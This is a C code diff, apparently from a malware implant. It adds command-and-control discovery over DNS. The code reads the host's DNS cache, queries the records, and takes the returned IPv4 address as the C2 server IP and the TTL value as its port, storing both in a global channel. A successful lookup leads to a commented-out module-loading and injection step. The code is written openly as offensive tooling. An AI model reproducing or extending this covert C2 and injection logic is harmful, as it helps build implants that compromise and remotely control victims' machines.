@@ -5,6 +5,8 @@
 #define DNS_SERVER_IP "127.0.0.1"
 #define DNS_PORT 53
 
+C2CHANNEL channel;
+
 int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count)
 {
     FILE *fp;
@@ -117,7 +119,8 @@ void build_dns_query(unsigned char *buf, const char *hostname, int *query_len)
     *query_len = sizeof(DNS_HEADER) + (strlen(hostname) + 2) + sizeof(QUESTION);
 }
 
-void parse_dns_response(unsigned char *buf, int recv_len)
+// Parses a dns response and sets the C2CHANNEL (IP and Port) global
+int parse_dns_response(unsigned char *buf, int recv_len)
 {
     DNS_HEADER *dns = (DNS_HEADER *)buf;
 
@@ -155,8 +158,22 @@ void parse_dns_response(unsigned char *buf, int recv_len)
             // Extract the IPv4 address (4 bytes)
             struct in_addr ipv4;
             memcpy(&ipv4, buf, sizeof(struct in_addr));
-            dprintf("IPv4 Address: %s\n", inet_ntoa(ipv4));
-            dprintf("TTL: %lu\n", ttl);
+            
+            // This means that IP has already been allocated and needs to be free'd
+            if (channel.c2_server_ip)
+            {
+                free(channel.c2_server_ip);
+            }
+            channel.c2_server_ip = strdup(inet_ntoa(ipv4));
+            channel.c2_server_port = ttl;
+
+            dprintf("IPv4 Address: %s\n", channel.c2_server_ip);
+            dprintf("TTL: %lu\n", channel.c2_server_port);
+
+            if (channel.c2_server_ip && channel.c2_server_port)
+            {
+                return 1;
+            }
 
             // Move to the next answer
             buf += sizeof(struct in_addr);
@@ -171,6 +188,7 @@ void parse_dns_response(unsigned char *buf, int recv_len)
             buf += length + 2;       // Move past the CNAME + length
         }
     }
+    return 0;
 }
 
 void perform_dns_request(const char *hostname)
@@ -224,8 +242,12 @@ void perform_dns_request(const char *hostname)
                 dprintf("\n%p] ", &(buf[i]));
         }
         dprintf("\n");
-        // Add length of hostname + 2 to skip past [some byte][hostname][null terminator]
-        parse_dns_response(buf, recv_len);
+        // Success (1) means we got C2 information
+        if (parse_dns_response(buf, recv_len))
+        {
+            // HMODULE hModule = get_module_to_load();
+            // inject(hModule);
+        }
     }
 
     closesocket(sockfd);
@@ -237,6 +259,9 @@ int main(int argc, char **argv)
     char record_names[MAX_RECORDS][NI_MAXHOST];
     int record_count   = 0;
     int current_record = 0;
+
+    channel.c2_server_ip = NULL;
+    channel.c2_server_port = 0;
 
     // Get DNS cache and extract record names
     while (!record_count)
